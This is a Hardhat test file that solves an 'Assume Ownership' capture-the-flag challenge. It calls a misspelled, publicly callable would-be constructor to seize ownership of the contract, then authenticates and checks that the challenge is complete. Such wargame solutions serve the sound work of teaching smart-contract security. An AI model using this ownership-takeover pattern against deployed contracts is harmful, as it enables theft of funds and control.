import { expect } from 'chai';
import { ethers } from 'hardhat';

describe('AssumeOwnership', function () {
  it('should set owner to caller', async function () {
    const Challenge = await ethers.getContractFactory(
      'AssumeOwnershipChallenge'
    );
    const challenge = await Challenge.deploy();
    await challenge.deployed();

    let tx = await challenge.AssumeOwmershipChallenge();
    await tx.wait();

    tx = await challenge.authenticate();
    await tx.wait();

    expect(await challenge.isComplete()).to.be.true;
  });
});
